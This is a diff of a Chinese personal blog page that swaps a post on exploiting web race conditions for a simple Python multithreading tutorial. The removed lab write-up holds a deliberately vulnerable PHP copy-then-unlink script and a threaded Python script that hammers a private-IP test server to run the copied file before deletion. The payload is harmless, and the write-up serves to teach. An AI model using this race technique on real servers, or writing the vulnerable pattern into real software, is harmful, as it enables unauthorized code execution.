@@ -5,12 +5,10 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="Web条件竞争利用, Elapse&#39;s Blog">
-    <meta name="description" content="类似前言一样的东西条件竞争是真的好玩，佛了
-解释先上例子
-&amp;lt;?php
-    print(&amp;quot;Hello,This is test server&amp;quot;);
-    if(isset($_GET[&amp;#39;src&amp;#39;">
+    <meta name="keywords" content="Elapse&#39;s Blog">
+    <meta name="description" content="Python3多线程在网上看了python多线程的教程，但是基本都不讲为什么要这么写，而且写的东西太多def了，看的就很乱，思考了几秒钟决定自己写上一篇，不喜勿喷
+
+开始正题按照惯例一般都会先上个代码，照着代码来讲，所以我今天就不按照惯例来">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -18,7 +16,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>Web条件竞争利用 | Elapse&#39;s Blog</title>
+    <title>Elapse&#39;s Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -258,13 +256,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/21.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('/medias/featureimages/0.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        Web条件竞争利用
+                        
                     </div>
                 </div>
             </div>
@@ -373,99 +371,76 @@
     <div class="card">
         <div class="card-content article-info">
             
-            <div class="article-tag">
-                
-                <a href="/tags/网络安全/" target="_blank">
-                    <span class="chip bg-color">网络安全</span>
-                </a>
-                
-            </div>
-            
             <div class="post-info">
-                
-                <span class="post-cate">
-                    <i class="fa fa-bookmark fa-fw icon-category"></i>
-                    
-                    <a href="/categories/网络安全/" class="post-category" target="_blank">
-                        网络安全
-                    </a>
-                    
-                </span>
                 
 
                 <span class="post-date">
-                    <i class="fa fa-clock-o fa-fw"></i>2018-12-22
+                    <i class="fa fa-clock-o fa-fw"></i>2018-12-29
                 </span>
             </div>
         </div>
         <hr>
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="类似前言一样的东西"><a href="#类似前言一样的东西" class="headerlink" title="类似前言一样的东西"></a>类似前言一样的东西</h1><p>条件竞争是真的好玩，佛了</p>
-<h1 id="解释"><a href="#解释" class="headerlink" title="解释"></a>解释</h1><p>先上例子</p>
-<pre><code>&lt;?php
-    print(&quot;Hello,This is test server&quot;);
-    if(isset($_GET[&#39;src&#39;])){
-        copy($_GET[&#39;src&#39;],$_GET[&#39;dst&#39;]);
-        unlink($_GET[&#39;dst&#39;]);
-}
-    else{
-        print(&quot;Error!&quot;);
-?&gt;
-</code></pre><p>这是典型的条件竞争利用的点，正常的服务器操作，是copy参数src的文件名和参数dst的文件名，复制完毕后，立马unlink删除，那么条件竞争呢，就是利用复制完毕，卡还没来得及删除的时间点，访问文件，执行恶意代码，而恶意代码已经执行完成了，那么文件删不删除都不重要了，具体的流程如下图<br><img src="http://t1.aixinxi.net/o_1cvb5umk7lo14bt1ibc1bb1tn5a.jpg-j.jpg" alt=""><br>一目了然，小天才说的就是我吧</p>
-<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><ul>
-<li>靶机: CentOS6.5</li>
-<li>PHP</li>
-</ul>
-<p>首先现在靶机安装httpd服务，再安装php<br>完成后，开始配置环境<br><img src="http://t1.aixinxi.net/o_1cvb66l211rls7nf54ig7kbm6a.png-j.jpg" alt=""><br>Elapse.php和file.php的内容为</p>
-<pre><code>Elapse.php:
-
-&lt;?php
-    print(&quot;Hello,This is test server&quot;);
-    if(isset($_GET[&#39;src&#39;])){
-        copy($_GET[&#39;src&#39;],$_GET[&#39;dst&#39;]);
-        unlink($_GET[&#39;dst&#39;]);
-}
-    else{
-        print(&quot;Error!&quot;);
-?&gt;
------------优秀的分割线-----------
-
-file.php:
-
-&lt;?php
-$myfile = fopen(&quot;test.txt&quot;,&quot;w&quot;);
-$txt = &quot;ElapseNB\n&quot;;
-fwrite($myfile,$txt);
-?&gt;
-</code></pre><p>具体利用方式就是，通过访问Elapse.php，传入参数将file.php copy出来然后同时访问新文件<br>这里用的是python3多线程</p>
-<pre><code>import requests
+                <h1 id="Python3多线程"><a href="#Python3多线程" class="headerlink" title="Python3多线程"></a>Python3多线程</h1><p>在网上看了python多线程的教程，但是基本都不讲为什么要这么写，而且写的东西太多def了，看的就很乱，思考了几秒钟决定自己写上一篇，不喜勿喷</p>
+<p><img src="http://t1.aixinxi.net/o_1cvsks3ck16f71qt0lrk2q89kta.jpg-j.jpg" alt=""></p>
+<h2 id="开始正题"><a href="#开始正题" class="headerlink" title="开始正题"></a>开始正题</h2><p>按照惯例一般都会先上个代码，照着代码来讲，所以我今天就不按照惯例来，毕竟距离2019也没几天了，我要用这种方法小抗议一下</p>
+<p>那么何为多线程呢，多线程，英文<code>multithreading</code>，指的是从软件或者硬件上实现多个线程并发执行的技术</p>
+<p>翻译成人话就是，可以通过软件或者硬件上，实现同时干几件事情</p>
+<p>那么为什么今天要说Python的多线程呢<br><del>因为其他的我不会</del></p>
+<p>下面说一下咋整<br>首先，写好步骤，我这里省时间，就随便弄个print就完事了</p>
+<pre><code>#coding: utf-8
 import threading
 
-url1 = &#39;http://192.168.1.111/Elapse.php?src=file.php&amp;dst=myfile.php&#39;
-url2 = &#39;http://192.168.1.111/myfile.php&#39;
+#创建步骤
+def printf(name):
+    for i in range(5):
+        print(&quot;My name is :&quot;+name)
+#定义name
+name1=&quot;Elapse&quot;
+name2=&quot;Ernket&quot;
 
-def filecreate(url):
-    while True:
-        try:
-            requests.get(url)
-        except:
-            print(&quot;not find file&quot;)
-def main():
-    threads = []
-    for e in range(10):
-        t1 = threading.Thread(target=filecreate,args=(url1,))
-        t2 = threading.Thread(target=filecreate,args=(url2,))
-        threads.append(t1)
-        threads.append(t2)
-        t1.start()
-        t2.start()
-    print(&quot;Successful!&quot;)
-if __name__ == &#39;__main__&#39;:
-    main()
-</code></pre><p>创建两个线程，同时访问两个url<br>运行结果:<br><img src="http://t1.aixinxi.net/o_1cvb6q0s01usu1al81dvk1qippfja.png-j.jpg" alt=""></p>
-<p><img src="http://t1.aixinxi.net/o_1cvb6oisfcnr10kukkd1q9fv95a.png-j.jpg" alt=""><br>在服务器种可以看到多出来了一个文件，内容为ElapseNB</p>
-<p>(小天才说的就是我8)<br>带哥们觉得代码有用不妨打个赏吧，都是纯手敲的呀，不是百度复制来的，小elapse没钱吃肉包了: )</p>
+threads = []
+#创建进程
+thread1 = threading.Thread(target=printf,args=(name1,))
+thread2 = threading.Thread(target=printf,args=(name2,))
+threads.append(thread1)
+threads.append(thread2)
+#开启线程
+for t in threads:
+    t.start()
+
+print(&#39;Done&#39;)
+</code></pre><p>首先，导入模块，最重要的一步</p>
+<pre><code>import threading
+</code></pre><p>接着，定义一个操作，我这里是print</p>
+<pre><code>...
+def printf(name):
+    for i in range(5):
+        print(&quot;My name is :&quot;+name)
+</code></pre><p>然后，可以开始创建线程了</p>
+<pre><code>...
+#定义name
+name1=&quot;Elapse&quot;
+name2=&quot;Ernket&quot;
+
+threads = []
+#创建进程
+thread1 = threading.Thread(target=printf,args=(name1,))
+thread2 = threading.Thread(target=printf,args=(name2,))
+threads.append(thread1)
+threads.append(thread2)
+</code></pre><p>因为我需要把进程都保存起来，所以一开始得创建一个空的函数，<code>threads=[]</code><br>接着创建两个线程<code>target</code>设置的是指定def，args指的是内容<br>把这两个线程都append到threads中</p>
+<p>然后开启线程吧</p>
+<pre><code>...
+#开启线程
+for t in threads:
+    t.start()
+
+print(&#39;Done&#39;)
+</code></pre><p>运行完后，输出一个Done庆祝一下<br>到了这一步，你能理解完，那么恭喜你，浪费了人生宝贵的几十分钟，因为我都不知道多线程到底有啥用，它同时做的我不同的写法也能写出来</p>
+<p>最后的最后，距离2018年也快结束了，没啥好感慨的，也没啥好祝福的，那么就留一个小彩蛋</p>
+<p>看到这条消息的在公众号后台留言”Elapse是真的帅”，过年那天我会随机一个人，发个不大不小的小红包</p>
 
             </div>
             <hr/>
@@ -604,7 +579,7 @@ if __name__ == &#39;__main__&#39;:
                     <span class="reprint-tip">转载请注明: </span>
                     <a href="https://Ernket.github.io" class="b-link-green">Elapse's Blog</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2018/12/22/Web条件竞争利用/" class="b-link-green">Web条件竞争利用</a>
+                    <a href="/2018/12/29/Python3多线程/" class="b-link-green"></a>
                 </p>
             </div>
         </div>
@@ -625,8 +600,8 @@ if __name__ == &#39;__main__&#39;:
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge left-badge text-color">上一篇</div>
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">本篇</div>
             <div class="card">
                 <a href="/2018/12/29/Python3多线程/">
                     <div class="card-image">
@@ -642,9 +617,9 @@ if __name__ == &#39;__main__&#39;:
 
 开始正题按照惯例一般都会先上个代码，照着代码来讲，所以我今天就不按照惯例来</div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2018-12-29
-                        </span>
+                            <span class="publish-date">
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-12-29
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-user fa-fw"></i>
@@ -653,6 +628,7 @@ if __name__ == &#39;__main__&#39;:
                         </span>
                     </div>
                 </div>
+
                 
             </div>
         </div>
@@ -661,32 +637,31 @@ if __name__ == &#39;__main__&#39;:
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">下一篇</div>
             <div class="card">
-                <a href="/2018/12/11/Python3栅栏密码解密/">
+                <a href="/2018/12/22/Web条件竞争利用/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/1.jpg" class="responsive-img" alt="Python3栅栏密码解密">
+                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="Web条件竞争利用">
                         
-                        <span class="card-title">Python3栅栏密码解密</span>
+                        <span class="card-title">Web条件竞争利用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">类似前言一样的东西栅栏密码关于加密的栅栏数，可以不整除字符串长度，但是我只会整除的，所以没有考虑不能整除的解密方法
-作用自动根据字符串长度破解栅栏密码
-环境
-python3
-
-栅栏密码解密栅栏密码是一种简单的移动字符位置的加密方法，规则简单</div>
+                    <div class="summary">类似前言一样的东西条件竞争是真的好玩，佛了
+解释先上例子
+&lt;?php
+    print(&quot;Hello,This is test server&quot;);
+    if(isset($_GET[&#39;src&#39;</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-12-11
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2018-12-22
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Python/" class="post-category" target="_blank">
-                                    Python
+                            <a href="/categories/网络安全/" class="post-category" target="_blank">
+                                    网络安全
                                 </a>
                             
                             
@@ -696,8 +671,8 @@ python3
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/Python/" target="_blank">
-                        <span class="chip bg-color">Python</span>
+                    <a href="/tags/网络安全/" target="_blank">
+                        <span class="chip bg-color">网络安全</span>
                     </a>
                     
                 </div>
